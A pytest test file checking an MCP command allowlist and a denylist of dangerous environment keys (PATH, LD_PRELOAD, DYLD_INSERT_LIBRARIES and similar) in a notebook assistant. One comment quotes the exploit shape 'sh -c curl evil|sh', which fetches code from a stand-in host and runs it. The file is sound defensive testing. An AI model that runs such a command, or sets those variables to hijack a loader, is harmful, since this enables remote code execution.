# Copyright (c) Mehmet Bektas <mbektasgh@outlook.com>

"""Tests for ``notebook_intelligence.mcp_policy``.

The MCP stdio command allowlist is an opt-in admin gate. Empty list means
no enforcement (default, permissive); a non-empty list rejects any
``command`` that does not match at least one of the supplied regex
patterns. The gate is applied at both insertion points: the Claude-mode
``mcp add`` shell-out and the in-process MCP loader that reads
``mcp.json`` at session start. The two managers share this validator so
the two surfaces cannot drift.
"""

from __future__ import annotations

import pytest

from notebook_intelligence.mcp_policy import (
    DANGEROUS_MCP_ENV_KEYS,
    compile_allowlist,
    reject_dangerous_env_keys,
    validate_mcp_stdio_command,
)


class TestCompileAllowlist:
    def test_compiles_valid_patterns(self):
        patterns = compile_allowlist(["^uv$", "^npx$"])
        assert len(patterns) == 2
        assert patterns[0].search("uv") is not None

    def test_rejects_invalid_pattern_with_helpful_message(self):
        # Loud-fail on a typo'd regex so the admin notices before the bad
        # policy ships to production. Silent skipping would convert the
        # allowlist from "deny by default" to "allow everything" on syntax
        # error, which is the opposite of what an admin enabling the gate
        # expects.
        with pytest.raises(ValueError, match="Invalid regex"):
            compile_allowlist(["[", "^uv$"])


class TestValidateCommand:
    def test_empty_allowlist_allows_anything(self):
        # Default state for unmodified deployments.
        validate_mcp_stdio_command("sh", [])
        validate_mcp_stdio_command("rm", [])

    def test_matches_one_of_several_patterns(self):
        validate_mcp_stdio_command("uv", ["^uv$", "^npx$"])
        validate_mcp_stdio_command("npx", ["^uv$", "^npx$"])

    def test_rejects_unmatched_command(self):
        with pytest.raises(ValueError, match="not in the admin allowlist"):
            validate_mcp_stdio_command("sh", ["^uv$", "^npx$"])

    def test_rejects_shell_with_strict_pattern(self):
        # The motivating exploit shape: command='sh', args=['-c', 'curl evil|sh'].
        # A strict pattern set rejects the shell binary before fork.
        with pytest.raises(ValueError):
            validate_mcp_stdio_command("sh", ["^uv$", "^uvx$", "^npx$"])

    def test_rejects_empty_or_non_string(self):
        with pytest.raises(ValueError):
            validate_mcp_stdio_command("", ["^uv$"])
        with pytest.raises(ValueError):
            validate_mcp_stdio_command(None, ["^uv$"])

    def test_invalid_regex_surfaces_through_validator(self):
        with pytest.raises(ValueError, match="Invalid regex"):
            validate_mcp_stdio_command("uv", ["["])

    def test_absolute_path_match(self):
        # Admins often pin the full resolved path so a $PATH change cannot
        # silently swap the binary.
        validate_mcp_stdio_command(
            "/usr/local/bin/uv", ["^/usr/local/bin/(uv|uvx|npx)$"]
        )
        with pytest.raises(ValueError):
            validate_mcp_stdio_command(
                "/tmp/uv", ["^/usr/local/bin/(uv|uvx|npx)$"]
            )

    def test_search_matches_anywhere_by_default(self):
        # No anchor means substring match. Documents the default semantics
        # so admins know they need ^ ... $ to require equality.
        validate_mcp_stdio_command("uvtool", ["uv"])


class TestRejectDangerousEnvKeys:
    def test_empty_env_passes(self):
        reject_dangerous_env_keys(None)
        reject_dangerous_env_keys({})

    @pytest.mark.parametrize(
        "key",
        ["PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "PYTHONPATH", "NODE_OPTIONS"],
    )
    def test_rejects_classic_path_bypasses(self, key):
        with pytest.raises(ValueError, match=f"MCP env key {key!r}"):
            reject_dangerous_env_keys({key: "/tmp/evil"})

    def test_case_insensitive(self):
        # Defense in depth: the dynamic loader honors some variants case
        # insensitively, and admins making a typo benefit from a loud
        # rejection on the lowercase form too.
        with pytest.raises(ValueError):
            reject_dangerous_env_keys({"path": "/tmp/evil"})

    @pytest.mark.parametrize(
        "key",
        [
            " PATH",         # leading space
            "PATH ",         # trailing space
            "PATH\t",        # trailing tab
            "\tLD_PRELOAD",  # leading tab
            " ld_preload",   # mixed: space + case
        ],
    )
    def test_whitespace_normalization(self, key):
        # An entry whose name has surrounding whitespace would otherwise
        # bypass a strict case-only comparison. The denylist normalizes
        # via strip+upper before comparing, so smuggling via " PATH" or
        # "PATH\t" is rejected the same way as "PATH".
        with pytest.raises(ValueError):
            reject_dangerous_env_keys({key: "/tmp/evil"})

    def test_safe_env_keys_pass(self):
        reject_dangerous_env_keys({"API_TOKEN": "x", "REGION": "us-east-1"})

    def test_dangerous_set_is_non_empty_and_includes_macos_keys(self):
        assert "DYLD_INSERT_LIBRARIES" in DANGEROUS_MCP_ENV_KEYS
        assert "LD_AUDIT" in DANGEROUS_MCP_ENV_KEYS
